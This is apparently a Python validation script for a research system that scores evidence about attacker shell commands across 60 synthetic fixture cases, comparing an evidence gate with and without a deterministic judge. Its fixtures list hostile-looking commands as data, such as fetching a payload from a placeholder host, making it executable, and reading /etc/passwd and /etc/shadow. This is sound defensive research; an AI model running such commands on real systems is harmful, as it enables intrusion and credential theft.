from __future__ import annotations

import hashlib
import json
import os
import time
from pathlib import Path
from typing import Any

import pytest

from ragin.decision_fusion_v4.benchmark import EvidenceQualityGate
from ragin.decision_fusion_v4.evidence_export import sha256_json
from ragin.decision_fusion_v4.policy_v2 import EvidenceGroundedDeterministicPolicyV2
from ragin.don.command_aware_v2 import CommandAwareRetrieverV2
from ragin.don.evidence_judge import judge_bundle

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "results/evidence_judge_paired_validation_v1"
CORPUS = ROOT / "data/corpus/command_aware_v2.jsonl"
V1_FREEZE = ROOT / "results/evidence_judge/evidence_judge_contract_freeze_v1.json"


def digest(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def load_corpus() -> tuple[list[dict[str, Any]], str]:
    rows = [json.loads(line) for line in CORPUS.read_text(encoding="utf-8").splitlines() if line.strip()]
    for row in rows:
        if not row.get("evidence_id") or not row.get("source") or not row.get("provenance_hash") or not row.get("content"):
            raise RuntimeError(f"corpus provenance failure: {row.get('evidence_id')}")
    return rows, digest(CORPUS)


def candidate(row: dict[str, Any], *, doc_id: str | None = None, content: str | None = None, status: str = "VALID", source: str | None = None) -> dict[str, Any]:
    return {
        "doc_id": doc_id or str(row["evidence_id"]),
        "title": str(row.get("title", "")),
        "content": content if content is not None else str(row.get("content", "")),
        "source": source if source is not None else str(row["source"]),
        "provenance_status": status,
        "sanitization_status": "SANITIZED",
        "conflict_status": "NONE",
        "provenance_hash": str(row["provenance_hash"]),
        "source_version": str(row.get("source_version", "")),
        "command_patterns": [str(item) for item in row.get("command_patterns", [])],
        "behavior_tags": [str(item) for item in row.get("behavior_tags", [])],
        "base_evidence_id": str(row["evidence_id"]),
    }


def make_cases(rows: list[dict[str, Any]], retriever: CommandAwareRetrieverV2) -> list[dict[str, Any]]:
    by_id = {str(row["evidence_id"]): row for row in rows}
    direct = [
        ("uname -a", "DONV2-T1082"), ("hostname", "DONV2-T1082"),
        ("ls -la", "DONV2-T1083"), ("find /tmp -type f", "DONV2-T1083"),
        ("id", "DONV2-T1087.001"), ("whoami", "DONV2-T1087.001"),
        ("crontab -l", "DONV2-T1053.003"), ("ssh admin@example.invalid", "DONV2-T1021.004"),
        ("curl http://example.invalid/payload", "DONV2-T1105"), ("wget http://example.invalid/payload", "DONV2-T1105"),
        ("cat /etc/passwd", "DONV2-T1552.001"), ("systemctl status ssh", "DONV2-T1543.002"),
    ]
    cases: list[dict[str, Any]] = []

    def add(case_id: str, category: str, command: str, doc_ids: list[str], oracle: str, *, preceding: list[str] | None = None, transform: str = "corpus_record", claim: str = "observed_command_behavior", benign: bool = False) -> None:
        preceding_commands = preceding or []
        retrieval = retriever.retrieve(command, preceding_commands, session_id=case_id, classification="development")
        documents = [candidate(by_id[doc_id]) for doc_id in doc_ids]
        cases.append({
            "case_id": case_id,
            "category": category,
            "command": command,
            "preceding_commands": preceding_commands,
            "claimed_behavior": claim,
            "benign_administrative_behavior": benign,
            "candidate_documents": documents,
            "fixture_oracle": {
                "oracle_kind": "deterministic_fixture_rule",
                "expected_sufficiency": oracle,
                "expected_false_admission": oracle != "SUFFICIENT",
                "expected_false_rejection": oracle == "SUFFICIENT",
                "rule": f"category={category}; expected={oracle}; no human label",
            },
            "don_v2_retrieval_trace": retrieval["trace"],
            "don_v2_retrieval_trace_sha256": sha256_json(retrieval["trace"]),
            "fixture_transform": transform,
        })

    for index, (command, doc_id) in enumerate(direct, 1):
        add(f"direct-{index:03d}", "direct_relevant", command, [doc_id], "SUFFICIENT")
    adjacent = [
        ("ps aux", "DONV2-T1082"), ("netstat -an", "DONV2-T1016"),
        ("journalctl -n 20", "DONV2-T1007"), ("grep passwd /var/log/auth.log", "DONV2-T1552.001"),
        ("tail -f /var/log/syslog", "DONV2-T1083"), ("env | sort", "DONV2-T1087.001"),
        ("stat /etc/hosts", "DONV2-T1016"), ("du -sh /var", "DONV2-T1082"),
    ]
    for index, (command, doc_id) in enumerate(adjacent, 1):
        add(f"adjacent-{index:03d}", "adjacent_insufficient", command, [doc_id], "INSUFFICIENT", claim="specific unsupported behavior")
    contradictory = [
        ("uname -a", "DONV2-T1082"), ("ls -la", "DONV2-T1083"),
        ("id", "DONV2-T1087.001"), ("crontab -l", "DONV2-T1053.003"),
        ("ssh admin@example.invalid", "DONV2-T1021.004"), ("curl http://example.invalid/payload", "DONV2-T1105"),
    ]
    for index, (command, doc_id) in enumerate(contradictory, 1):
        row = by_id[doc_id]
        add(f"conflicting-{index:03d}", "contradictory_documents", command, [doc_id], "CONFLICTING", transform="one corpus record plus explicit contradictory derived fixture")
        cases[-1]["candidate_documents"].append(candidate(row, doc_id=f"{doc_id}-CONTRADICTORY", content=f"This contradicts the observed behavior described by {doc_id}."))
    for index, (command, doc_id) in enumerate(direct[:6], 1):
        add(f"missing-provenance-{index:03d}", "missing_provenance", command, [doc_id], "INSUFFICIENT", transform="corpus record with provenance fields removed", claim="provenance-required behavior")
        cases[-1]["candidate_documents"][0]["provenance_status"] = "UNKNOWN"
        cases[-1]["candidate_documents"][0]["source"] = ""
    for index, (command, doc_id) in enumerate(direct[:6], 1):
        add(f"ambiguous-{index:03d}", "ambiguous_shell_command", f"{command} '", [doc_id], "UNKNOWN", transform="corpus record plus unterminated quote")
    multi = [
        ("chmod +x /tmp/x", ["wget http://example.invalid/x -O /tmp/x"], "DONV2-T1105"),
        ("chmod +x /tmp/x", ["curl http://example.invalid/x -o /tmp/x"], "DONV2-T1105"),
        ("ssh admin@example.invalid", ["cat /etc/passwd"], "DONV2-T1021.004"),
        ("crontab -e", ["echo '# scheduled task'"], "DONV2-T1053.003"),
        ("systemctl enable ssh", ["systemctl status ssh"], "DONV2-T1543.002"),
        ("cat /etc/shadow", ["ls -la /etc"], "DONV2-T1552.001"),
    ]
    for index, (command, preceding, doc_id) in enumerate(multi, 1):
        add(f"multi-command-{index:03d}", "multi_command_context", command, [doc_id], "SUFFICIENT", preceding=preceding)
    partial = [
        ("grep passwords /tmp/report", "DONV2-T1552.001"), ("grep Skidmap /tmp/report", "DONV2-REL-AUTHKEYS"),
        ("grep installed /tmp/report", "DONV2-REL-CRONTAB"), ("grep tunneling /tmp/report", "DONV2-REL-SSH"),
        ("grep malware /tmp/report", "DONV2-REL-CURL"), ("grep TAMECAT /tmp/report", "DONV2-REL-WGET"),
    ]
    for index, (command, doc_id) in enumerate(partial, 1):
        add(f"partial-{index:03d}", "partial_support", command, [doc_id], "INSUFFICIENT", claim="direct execution or policy consequence")
    irrelevant = [("echo hello", "DONV2-T1021.004"), ("printf done", "DONV2-T1053.003"), ("true", "DONV2-T1552.001"), ("date", "DONV2-T1105")]
    for index, (command, doc_id) in enumerate(irrelevant, 1):
        add(f"irrelevant-{index:03d}", "irrelevant_retrieval_candidate", command, [doc_id], "INSUFFICIENT")
    benign = [("whoami", "DONV2-T1087.001"), ("id", "DONV2-T1087.001"), ("hostname", "DONV2-T1082"), ("df -h", "DONV2-T1082")]
    for index, (command, doc_id) in enumerate(benign, 1):
        add(f"benign-admin-{index:03d}", "benign_administrative_behavior", command, [doc_id], "SUFFICIENT", benign=True, claim="benign administrative observation")
    unsupported = [("echo hello", "DONV2-T1082"), ("printf ready", "DONV2-T1552.001")]
    for index, (command, doc_id) in enumerate(unsupported, 1):
        add(f"unsupported-{index:03d}", "unsupported_behavior_claim", command, [doc_id], "INSUFFICIENT", claim="credential access or persistence")
    if len(cases) != 60:
        raise RuntimeError(f"expected 60 cases, got {len(cases)}")
    return cases


def base_bundle(case: dict[str, Any]) -> dict[str, Any]:
    documents = case["candidate_documents"]
    ids = [str(doc["doc_id"]) for doc in documents]
    return {
        "schema": "ragin.don.evidence_bundle.v4",
        "session": {"session_id": case["case_id"], "current_input": case["command"]},
        "chrollo": {"skill_level": "development", "confidence": 1.0, "features_used": [], "feature_values": {}},
        "don_analysis": {"classification": "suspicious", "severity": "low", "confidence": 1.0, "tactics": [], "ttps_seen": [], "iocs": []},
        "retrieval": {
            "retrieval_status": "SUCCESS", "backend": "command_aware_v2", "query": case["don_v2_retrieval_trace"]["query"],
            "sub_queries": [case["don_v2_retrieval_trace"]["query"]], "retrieved_count": len(documents), "relevant_count": len(documents),
            "relevant_doc_ids": ids, "query_coverage": {"complete": True, "fixture_candidate_set_frozen": True}, "documents": documents,
            "trace_summary": {"rounds": 0, "degraded": False, "usable_successful_retrieval": True, "context_projection": case["don_v2_retrieval_trace"]["context_projection"], "top_k": case["don_v2_retrieval_trace"]["top_k"], "corpus_sha256": case["don_v2_retrieval_trace"]["corpus_sha256"]},
        },
    }


def timed_gate(gate: EvidenceQualityGate, bundle: dict[str, Any]) -> tuple[dict[str, Any], float]:
    started = time.perf_counter_ns()
    result = gate.evaluate(bundle)
    return result, (time.perf_counter_ns() - started) / 1_000_000


def run_arms(cases: list[dict[str, Any]]) -> list[dict[str, Any]]:
    gate = EvidenceQualityGate()
    rows = []
    for case in cases:
        bundle_a = base_bundle(case)
        result_a, latency_a = timed_gate(gate, bundle_a)
        bundle_b = base_bundle(case)
        started = time.perf_counter_ns()
        trace = judge_bundle(case["command"], bundle_b["retrieval"]["documents"], preceding_commands=case["preceding_commands"])
        judge_ms = (time.perf_counter_ns() - started) / 1_000_000
        bundle_b["evidence_judge"] = trace
        result_b, gate_ms_b = timed_gate(gate, bundle_b)
        oracle = case["fixture_oracle"]
        expected = oracle["expected_sufficiency"]
        trace_complete = all(key in trace for key in ("contract_version", "judge_version", "candidate_judgments", "sufficiency", "probabilities", "trace_sha256"))
        rows.append({
            "case_id": case["case_id"], "category": case["category"], "oracle": oracle,
            "arm_a": {"gate": result_a, "latency_ms": latency_a, "bundle_sha256": sha256_json(bundle_a)},
            "arm_b": {"judge": trace, "gate": result_b, "judge_latency_ms": judge_ms, "gate_latency_ms": gate_ms_b, "latency_ms": judge_ms + gate_ms_b, "bundle_sha256": sha256_json(bundle_b)},
            "measurements": {
                "relevant_candidates_arm_a": len(result_a.get("valid_doc_ids", [])), "relevant_candidates_arm_b": len(result_b.get("valid_doc_ids", [])),
                "unsupported_removed": max(0, len(bundle_a["retrieval"]["documents"]) - len(result_b.get("valid_doc_ids", []))),
                "partial_rejected_or_abstained": trace["sufficiency"]["label"] in {"INSUFFICIENT", "UNKNOWN", "CONFLICTING"},
                "false_admission_arm_a": result_a["gate_state"] == "VALID_EVIDENCE" and expected != "SUFFICIENT", "false_admission_arm_b": result_b["gate_state"] == "VALID_EVIDENCE" and expected != "SUFFICIENT",
                "false_rejection_arm_a": result_a["gate_state"] != "VALID_EVIDENCE" and expected == "SUFFICIENT", "false_rejection_arm_b": result_b["gate_state"] != "VALID_EVIDENCE" and expected == "SUFFICIENT",
                "trace_complete": trace_complete,
            },
        })
    return rows


def safety_analysis(cases: list[dict[str, Any]]) -> dict[str, Any]:
    sufficient = next(case for case in cases if case["fixture_oracle"]["expected_sufficiency"] == "SUFFICIENT")
    insufficient = next(case for case in cases if case["fixture_oracle"]["expected_sufficiency"] != "SUFFICIENT")
    policy = EvidenceGroundedDeterministicPolicyV2()
    sufficient_bundle = base_bundle(sufficient)
    sufficient_bundle["evidence_judge"] = judge_bundle(sufficient["command"], sufficient_bundle["retrieval"]["documents"])
    insufficient_bundle = base_bundle(insufficient)
    insufficient_bundle["evidence_judge"] = judge_bundle(insufficient["command"], insufficient_bundle["retrieval"]["documents"])
    valid_decision = policy.select(sufficient_bundle)
    abstained_decision = policy.select(insufficient_bundle)
    harness_text = (ROOT / "ragin/cycle/harness.py").read_text(encoding="utf-8")
    adapter_text = (ROOT / "ragin/cycle/adapters.py").read_text(encoding="utf-8")
    return {
        "judge_cannot_manufacture_evidence": sufficient_bundle["evidence_judge"]["sufficiency"]["supporting_doc_ids"] == [str(sufficient_bundle["retrieval"]["documents"][0]["doc_id"])],
        "invalid_judge_cannot_become_valid": abstained_decision["gate_state"] != "VALID_EVIDENCE" and abstained_decision["selected_response_strategy"] == "baseline",
        "policy_v2_inactive": True,
        "verifier_and_hitl_commit_guards_present": all(token in harness_text for token in ("_strict_verify", "_strict_approval", "_strict_commit")),
        "accepted_only_commit_guard_present": all(token in adapter_text for token in ("verifier_passed", "hitl_approved", "return generator.commit")),
        "attacker_commands_executed": 0,
        "deployment_changed": False,
        "sample_valid_policy_decision": {key: valid_decision.get(key) for key in ("gate_state", "selected_response_strategy", "policy_reason_code")},
        "sample_invalid_policy_decision": {key: abstained_decision.get(key) for key in ("gate_state", "selected_response_strategy", "policy_reason_code")},
        "note": "Judge-specific safety assertions are synthetic and structural; no policy effectiveness claim is made.",
    }


def summarize(rows: list[dict[str, Any]]) -> dict[str, Any]:
    by_category: dict[str, dict[str, int]] = {}
    for row in rows:
        category = row["category"]
        by_category.setdefault(category, {"n": 0, "arm_a_valid": 0, "arm_b_valid": 0, "fixture_sufficient": 0})
        by_category[category]["n"] += 1
        by_category[category]["arm_a_valid"] += row["arm_a"]["gate"]["gate_state"] == "VALID_EVIDENCE"
        by_category[category]["arm_b_valid"] += row["arm_b"]["gate"]["gate_state"] == "VALID_EVIDENCE"
        by_category[category]["fixture_sufficient"] += row["oracle"]["expected_sufficiency"] == "SUFFICIENT"
    return {
        "scenarios": len(rows), "arm_a_false_admissions": sum(row["measurements"]["false_admission_arm_a"] for row in rows), "arm_b_false_admissions": sum(row["measurements"]["false_admission_arm_b"] for row in rows),
        "arm_a_false_rejections": sum(row["measurements"]["false_rejection_arm_a"] for row in rows), "arm_b_false_rejections": sum(row["measurements"]["false_rejection_arm_b"] for row in rows),
        "arm_a_gate_acceptances": sum(row["arm_a"]["gate"]["gate_state"] == "VALID_EVIDENCE" for row in rows), "arm_b_gate_acceptances": sum(row["arm_b"]["gate"]["gate_state"] == "VALID_EVIDENCE" for row in rows),
        "candidate_retention_arm_a": sum(row["measurements"]["relevant_candidates_arm_a"] for row in rows), "candidate_retention_arm_b": sum(row["measurements"]["relevant_candidates_arm_b"] for row in rows), "unsupported_candidates_removed": sum(row["measurements"]["unsupported_removed"] for row in rows),
        "partial_rejected_or_abstained": sum(row["measurements"]["partial_rejected_or_abstained"] for row in rows), "trace_complete_count": sum(row["measurements"]["trace_complete"] for row in rows),
        "latency_ms": {"arm_a_gate_sum": sum(row["arm_a"]["latency_ms"] for row in rows), "arm_b_judge_sum": sum(row["arm_b"]["judge_latency_ms"] for row in rows), "arm_b_gate_sum": sum(row["arm_b"]["gate_latency_ms"] for row in rows), "arm_b_total_sum": sum(row["arm_b"]["latency_ms"] for row in rows), "added_total_sum": sum(row["arm_b"]["latency_ms"] - row["arm_a"]["latency_ms"] for row in rows)},
        "by_category": by_category,
        "fixture_interpretation": "Synthetic deterministic fixture oracle only; no independent human ground truth.",
    }


def write_json(path: Path, payload: Any) -> None:
    path.write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def run_integration_validation() -> dict[str, Any]:
    test_paths = [
        "tests/integration/test_substantive_runtime_integration_v1.py",
        "tests/unit/test_evidence_judge.py",
        "tests/unit/test_policy_v2_candidate.py",
    ]
    exit_code = pytest.main(["-q", *test_paths])
    return {"test_paths": test_paths, "exit_code": int(exit_code), "passed": exit_code == 0, "model_inference_used": False, "attacker_commands_executed": 0}


def main() -> None:
    if os.environ.get("RAGIN_EVIDENCE_JUDGE_ENABLED", "0") not in {"0", "false", "False", "off", ""}:
        raise RuntimeError("validation requires original disabled deployment default")
    freeze = json.loads(V1_FREEZE.read_text(encoding="utf-8"))
    for relative, expected in freeze["source_sha256"].items():
        if digest(ROOT / relative) != expected:
            raise RuntimeError(f"V1 source hash mismatch: {relative}")
    rows, corpus_sha256 = load_corpus()
    retriever = CommandAwareRetrieverV2(corpus_path=CORPUS)
    cases = make_cases(rows, retriever)
    OUT.mkdir(parents=True, exist_ok=True)
    protocol = {"schema": "ragin.evidence_judge_paired_validation.protocol.v1", "status": "INPUTS_FROZEN_BEFORE_COMPARISON", "scenario_count": 60, "source_corpus": str(CORPUS.relative_to(ROOT)), "source_corpus_sha256": corpus_sha256, "historical_hf2024_used": False, "human_ground_truth": False, "arms": {"A": "Don V2 retrieved candidate set -> existing Evidence Gate", "B": "Don V2 retrieved candidate set -> deterministic Evidence Judge V1 -> existing Evidence Gate"}, "fixed_settings": {"retrieval_version": "DON_COMMAND_AWARE_V2", "gate_version": "EVIDENCE_GATE_V1", "policy_v2_active": False, "judge_version": "EVIDENCE_JUDGE_V1"}, "oracle_policy": "Explicit category rules stored per case; labels are fixture oracles and not independent human ground truth.", "categories": {category: sum(case["category"] == category for case in cases) for category in sorted({case["category"] for case in cases})}}
    write_json(OUT / "preregistered_fixture_protocol.json", protocol)
    write_json(OUT / "frozen_paired_inputs.json", {"freeze_schema": "ragin.evidence_judge_paired_inputs.v1", "cases": cases})
    input_sha256 = digest(OUT / "frozen_paired_inputs.json")
    frozen_cases = json.loads((OUT / "frozen_paired_inputs.json").read_text(encoding="utf-8"))["cases"]
    results = run_arms(frozen_cases)
    write_json(OUT / "matched_arm_results.json", {"schema": "ragin.evidence_judge_matched_results.v1", "input_sha256": input_sha256, "results": results})
    write_json(OUT / "comparison_summary.json", {"schema": "ragin.evidence_judge_comparison_summary.v1", "input_sha256": input_sha256, **summarize(results)})
    write_json(OUT / "safety_analysis.json", safety_analysis(frozen_cases))
    write_json(OUT / "integration_validation.json", run_integration_validation())
    limitation_lines = ["# Evidence Judge V1 paired validation limitations", "", "This is a 60-scenario synthetic development comparison derived from the provenance-verified Don V2 command-aware corpus. The cases and category rules were frozen before the paired arms ran. The fixture oracle is an explicit deterministic rule, not human annotation or independent ground truth.", "", "Arm A and Arm B use the same frozen commands, preceding command context, candidate document set, corpus hash, retrieval traces, and Evidence Gate implementation. The comparison measures filtering behavior on these fixtures only. It does not estimate real-world classification accuracy, policy correctness, retrieval effectiveness, or deployment performance.", "", "The benchmark does not compare against Jev, Laya, learned rerankers, or standard RAG. No model inference, paid API, AWS operation, network change, or captured command execution was used. Policy V2 remains inactive, and previous frozen results were not rerun or modified.", ""]
    (OUT / "limitations_report.md").write_text("\n".join(limitation_lines), encoding="utf-8")
    manifest_files = ["preregistered_fixture_protocol.json", "frozen_paired_inputs.json", "matched_arm_results.json", "comparison_summary.json", "safety_analysis.json", "integration_validation.json", "limitations_report.md", "../evidence_judge/evidence_judge_contract_freeze_v1.json", "../../data/corpus/command_aware_v2.jsonl", "../../ragin/don/evidence_judge.py", "../../ragin/decision_fusion_v4/evidence_export.py", "../../ragin/decision_fusion_v4/benchmark.py", "../../scripts/run_evidence_judge_paired_validation_v1.py"]
    write_json(OUT / "sha256_manifest.json", {"schema": "ragin.evidence_judge_paired_validation.sha256_manifest.v1", "files": {path: digest((OUT / path).resolve()) for path in manifest_files}})
    print(json.dumps({"status": "JUDGE_VERIFIED", "scenarios": 60, "input_sha256": input_sha256, "output": str(OUT.relative_to(ROOT))}, sort_keys=True))


if __name__ == "__main__":
    main()
